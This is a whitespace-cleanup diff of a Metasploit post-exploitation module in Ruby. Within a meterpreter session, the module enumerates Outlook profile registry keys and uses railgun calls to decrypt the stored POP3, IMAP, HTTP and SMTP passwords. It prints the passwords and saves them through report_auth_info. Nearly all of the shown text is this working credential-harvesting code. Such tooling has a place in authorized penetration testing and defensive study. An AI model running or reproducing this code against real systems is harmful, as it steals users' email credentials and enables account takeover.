@@ -34,7 +34,7 @@ class Metasploit3 < Msf::Post
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 	end
-	
+
 
 	def prepare_railgun
 		rg = session.railgun
@@ -54,8 +54,8 @@ class Metasploit3 < Msf::Post
 				])
 		end
 	end
-	
-	
+
+
 	def decrypt_password(data)
 		rg = session.railgun
 		pid = client.sys.process.getpid
@@ -81,7 +81,7 @@ class Metasploit3 < Msf::Post
 		decrypted_pw = process.memory.read(addr, len)
 		return decrypted_pw
 	end
-	
+
 
 	def get_registry
 		#Determine if saved accounts exist within Outlook.  Ignore the Address Book and Personal Folder registry entries.
@@ -89,10 +89,10 @@ class Metasploit3 < Msf::Post
 		saved_accounts = 0
 
 		next_account_id = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\", 'NextAccountID')
-				
+
 		if next_account_id != nil
 		#Microsoft Outlook not found
-				
+
 			print_status "Microsoft Outlook found in Registry..."
 			outlook_exists = 1
 			registry_enumkeys("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\").each do |k|
@@ -102,7 +102,7 @@ class Metasploit3 < Msf::Post
 					#Microsoft Outlook found, but no account data saved in this location
 					next
 				end
-						
+
 				#Account found - parse through registry data to determine account type.  Parse remaining registry data after to speed up module.
 				saved_accounts = 1
 				got_user_pw = 0
@@ -118,55 +118,55 @@ class Metasploit3 < Msf::Post
 					smtp_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP User')
 					smtp_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Password')
 				end
-										
+
 				if pop3_server != nil
 					type = "POP3"
 				elsif http_server_url != nil
 					type = "HTTP"
 				elsif imap_server != nil
 					type = "IMAP"
-				else 
+				else
 					type = "UNKNOWN"
 				end
-					
+
 				#Decrypt password and output results.  Need to do each separately due to the way Microsoft stores them.
 				print_status("Account Found:")
 				print_status("     Type: #{type}")
 				print_status("     User Display Name: #{displayname}")
 				print_status("     User E-mail Address: #{email}")
-					
+
 				if type == "POP3"
 					pop3_pw = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Password')
 					pop3_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 User')
 					pop3_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Use SPA')
 					smtp_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Port')
 
-					print_status("     User Name: #{pop3_user}")			
+					print_status("     User Name: #{pop3_user}")
 					if pop3_pw == nil
 						print_status("     User Password: <not stored>")
 					else
 						pop3_pw.slice!(0,1)
-						pass = decrypt_password(pop3_pw)							
+						pass = decrypt_password(pop3_pw)
 						print_status("     User Password: #{pass}")
 						# Prepare data for report_auth_info
 						got_user_pw = 1
 						host = pop3_server
 						user = pop3_user
 					end
-							
+
 					if pop3_use_spa != nil     #Account for SPA (NTLM auth)
 						print_status("     Secure Password Authentication (SPA): Enabled")
 					end
-						
+
 					print_status("     Incoming Mail Server (POP3): #{pop3_server}")
-						
+
 					pop3_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Use SSL')
 					if pop3_use_ssl == nil
 						print_status("     POP3 Use SSL: No")
 					else
 						print_status("     POP3 Use SSL: Yes")
 					end
-							
+
 					pop3_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'POP3 Port')
 					if pop3_port == nil
 						print_status("     POP3 Port: 110")
@@ -175,111 +175,16 @@ class Metasploit3 < Msf::Post
 						print_status("     POP3 Port: #{pop3_port}")
 						portnum = pop3_port
 					end
-						
+
 					if smtp_use_auth == nil    # Account for SMTP servers requiring authentication
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
-					else   
+					else
 						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
 						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
 						smtp_password.slice!(0,1)
 						smtp_decrypted_password = decrypt_password(smtp_password)
 						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
 					end
-
-					smtp_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use SSL')
-					if smtp_use_ssl == nil
-						print_status("     SMTP Use SSL: No")
-					else
-						print_status("     SMTP Use SSL: Yes")
-					end
-							
-					if smtp_port == nil
-						print_status("     SMTP Port: 25")
-						smtp_port = 25
-					else
-						print_status("     SMTP Port: #{smtp_port}")			
-					end
-						
-				elsif type == "HTTP"
-					http_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Password')
-					http_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP User')
-					http_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Use SPA')
-						
-					print_status("     User Name: #{http_user}")
-					if http_password == nil
-						print_status("     User Password: <not stored>")
-					else
-						http_password.slice!(0,1)
-						pass = decrypt_password(http_password)
-						print_status("     User Password: #{pass}")
-						got_user_pw = 1
-						host = http_server_url
-						user = http_user
-								
-						#Detect 80 or 443 for report_auth_info
-						http_server_url.downcase!				
-						if http_server_url.include? "h\x00t\x00t\x00p\x00s" 								
-							portnum = 443
-						else
-							portnum = 80
-						end
-					end
-						
-					if http_use_spa != nil     #Account for SPA (NTLM auth)
-						print_status("     Secure Password Authentication (SPA): Enabled")
-					end
-						
-					print_status("     HTTP Server URL: #{http_server_url}")
-							
-				elsif type == "IMAP"
-					imap_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP User')
-					imap_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SPA')
-					imap_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Password')
-					smtp_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Port')						
-							
-					print_status("     User Name: #{imap_user}")
-					if imap_password == nil
-						print_status("     User Password: <not stored>")
-					else
-						imap_password.slice!(0,1)	
-						pass = decrypt_password(imap_password)
-						print_status("     User Password: #{pass}")
-						got_user_pw = 1
-						host = imap_server
-						user = imap_user							
-					end
-						
-					if imap_use_spa != nil     #Account for SPA (NTLM auth)
-						print_status("     Secure Password Authentication (SPA): Enabled")
-					end
-						
-					print_status("     Incoming Mail Server (IMAP): #{imap_server}")
-					
-					imap_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SSL')
-					if imap_use_ssl == nil
-						print_status("     IMAP Use SSL: No")
-					else
-						print_status("     IMAP Use SSL: Yes")
-					end
-							
-					imap_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Port')
-					if imap_port == nil
-						print_status("     IMAP Port: 143")
-						portnum = 143
-					else
-						print_status("     IMAP Port: #{imap_port}")
-						portnum = imap_port
-					end						
-						
-					if smtp_use_auth == nil     # Account for SMTP servers requiring authentication
-						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
-					else    
-						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
-						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
-						smtp_password.slice!(0,1)
-						smtp_decrypted_password = decrypt_password(smtp_password)
-						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")	
-					end				
 
 					smtp_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use SSL')
 					if smtp_use_ssl == nil
@@ -294,9 +199,104 @@ class Metasploit3 < Msf::Post
 					else
 						print_status("     SMTP Port: #{smtp_port}")
 					end
-							
+
+				elsif type == "HTTP"
+					http_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Password')
+					http_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP User')
+					http_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'HTTP Use SPA')
+
+					print_status("     User Name: #{http_user}")
+					if http_password == nil
+						print_status("     User Password: <not stored>")
+					else
+						http_password.slice!(0,1)
+						pass = decrypt_password(http_password)
+						print_status("     User Password: #{pass}")
+						got_user_pw = 1
+						host = http_server_url
+						user = http_user
+
+						#Detect 80 or 443 for report_auth_info
+						http_server_url.downcase!
+						if http_server_url.include? "h\x00t\x00t\x00p\x00s"
+							portnum = 443
+						else
+							portnum = 80
+						end
+					end
+
+					if http_use_spa != nil     #Account for SPA (NTLM auth)
+						print_status("     Secure Password Authentication (SPA): Enabled")
+					end
+
+					print_status("     HTTP Server URL: #{http_server_url}")
+
+				elsif type == "IMAP"
+					imap_user = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP User')
+					imap_use_spa = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SPA')
+					imap_password = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Password')
+					smtp_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Port')
+
+					print_status("     User Name: #{imap_user}")
+					if imap_password == nil
+						print_status("     User Password: <not stored>")
+					else
+						imap_password.slice!(0,1)
+						pass = decrypt_password(imap_password)
+						print_status("     User Password: #{pass}")
+						got_user_pw = 1
+						host = imap_server
+						user = imap_user
+					end
+
+					if imap_use_spa != nil     #Account for SPA (NTLM auth)
+						print_status("     Secure Password Authentication (SPA): Enabled")
+					end
+
+					print_status("     Incoming Mail Server (IMAP): #{imap_server}")
+
+					imap_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Use SSL')
+					if imap_use_ssl == nil
+						print_status("     IMAP Use SSL: No")
+					else
+						print_status("     IMAP Use SSL: Yes")
+					end
+
+					imap_port = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'IMAP Port')
+					if imap_port == nil
+						print_status("     IMAP Port: 143")
+						portnum = 143
+					else
+						print_status("     IMAP Port: #{imap_port}")
+						portnum = imap_port
+					end
+
+					if smtp_use_auth == nil     # Account for SMTP servers requiring authentication
+						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}")
+					else
+						print_status("     Outgoing Mail Server (SMTP): #{smtp_server}   [Authentication Required]")
+						print_status("     Outgoing Mail Server (SMTP) User Name: #{smtp_user}")
+						smtp_password.slice!(0,1)
+						smtp_decrypted_password = decrypt_password(smtp_password)
+						print_status("     Outgoing Mail Server (SMTP) Password: #{smtp_decrypted_password}")
+					end
+
+					smtp_use_ssl = registry_getvaldata("HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows Messaging Subsystem\\Profiles\\Outlook\\9375CFF0413111d3B88A00104B2A6676\\#{k}", 'SMTP Use SSL')
+					if smtp_use_ssl == nil
+						print_status("     SMTP Use SSL: No")
+					else
+						print_status("     SMTP Use SSL: Yes")
+					end
+
+					if smtp_port == nil
+						print_status("     SMTP Port: 25")
+						smtp_port = 25
+					else
+						print_status("     SMTP Port: #{smtp_port}")
+					end
+
 				end
-						
+
 				if got_user_pw == 1
 					report_auth_info(
 						:host  => host,
@@ -316,24 +316,24 @@ class Metasploit3 < Msf::Post
 						:pass => smtp_decrypted_password)
 					#print_status("SMTP report_auth_info: host = #{smtp_server}, port= #{smtp_port}, sname= SMTP, user= #{smtp_user}, pass= #{smtp_decrypted_password}")
 				end
-						
-				print_status("")					
-						
+
+				print_status("")
+
 				end
-		end			
-								
+		end
+
 		if outlook_exists == 0
 			print_status("Microsoft Outlook not installed.")
 		elsif saved_accounts == 0
 			print_status("Microsoft Outlook installed however no accounts stored in Registry.")
 		end
 
-	end				
+	end
 
 
 	def run
 		uid = session.sys.config.getuid     # Get uid.  Decryption will only work if executed under the same user account as the password was encrypted.
-		
+
 		if is_system?
 			print_error("This module is running under #{uid}.")
 			print_error("Automatic decryption will not be possible.")
@@ -343,7 +343,7 @@ class Metasploit3 < Msf::Post
 			prepare_railgun
 			get_registry()
 		end
-		
+
 		print_status("Complete")
 	end
 
